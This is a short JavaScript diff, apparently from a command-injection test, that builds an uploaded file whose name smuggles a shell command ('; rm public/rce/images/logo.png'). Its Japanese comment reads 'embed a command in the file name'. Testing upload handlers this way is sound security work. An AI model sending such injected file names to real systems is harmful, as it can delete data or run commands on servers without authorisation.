@@ -385,7 +385,7 @@ const maliciousContent = 'dummy content';
 const blob = new Blob([maliciousContent], { type: 'application/pdf' });
 
 // ファイル名にコマンドを埋め込む
-const file = new File([blob], 'file.pdf; rm public/rce/images/logo.png', {
+const file = new File([blob], ';rm public/rce/images/logo.png', {
   type: 'application/pdf'
 });
 
